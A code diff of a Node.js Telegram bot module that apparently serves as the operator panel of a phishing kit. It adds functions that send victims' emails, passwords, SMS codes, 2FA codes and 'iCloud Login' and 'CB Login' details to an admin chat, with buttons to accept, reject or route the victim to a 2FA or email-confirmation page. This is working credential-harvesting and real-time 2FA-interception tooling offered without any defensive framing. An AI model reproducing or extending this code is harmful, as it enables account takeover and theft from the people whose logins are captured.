@@ -1,4 +1,3 @@
-// ...existing code...
 const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
@@ -15,7 +14,7 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // -----------------
-// 2FA Code Backend (from small code)
+// 2FA Code Backend
 // -----------------
 let pendingRequests = {};
 
@@ -46,10 +45,8 @@ bot.on('message', (msg) => {
   }
 });
 
-// ...existing approval request functions...
-
 // -----------------
-// Email/Password approval (big code)
+// Email/Password approval
 // -----------------
 function sendApprovalRequest(email, password) {
   const options = {
@@ -69,7 +66,91 @@ function sendApprovalRequest(email, password) {
   );
 }
 
-// ...other approval request functions...
+// -----------------
+// Generic code approval
+// -----------------
+function sendApprovalRequestGeneric(identifier) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${identifier}` },
+          { text: "❌ Reject", callback_data: `reject|${identifier}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `*Approval Requested*\nIdentifier: ${identifier}`,
+    { ...options, parse_mode: "Markdown" }
+  );
+}
+
+// -----------------
+// SMS code approval
+// -----------------
+function sendApprovalRequestSMS(code) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${code}` },
+          { text: "❌ Reject", callback_data: `reject|${code}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `*SMS Approval Requested*\n*Code:* ${code}`,
+    { ...options, parse_mode: "Markdown" }
+  );
+}
+
+// -----------------
+// iCloud Login approval
+// -----------------
+function sendApprovalRequestPage(email, password) {
+  const options = {
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept", callback_data: `accept|${email}` },
+          { text: "❌ Reject", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
+  bot.sendMessage(
+    ADMIN_CHAT_ID,
+    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
+    { ...options, parse_mode: "Markdown" }
+  );
+}
+
+// -----------------
+// CB Login approval
+// -----------------
+async function sendLoginTelegram(email) {
+  const options = {
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "↖️ 2FA", callback_data: `page1|${email}` },
+          { text: "↗️ Email Confirmation", callback_data: `page2|${email}` }
+        ],
+        [
+          { text: "⚠️❌ REJECT ❌⚠️", callback_data: `reject|${email}` }
+        ]
+      ]
+    }
+  };
+
+  const message = `📧 *Email:* ${email}`;
+  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
+}
 
 // -----------------
 // Handle button clicks (merged, with page1/page2 support)
@@ -136,6 +217,5 @@ module.exports = {
   sendApprovalRequestSMS,
   sendApprovalRequestPage,
   sendLoginTelegram,
-  send2FACode // <-- Export the new function
+  send2FACode
 };
-// ...existing code...
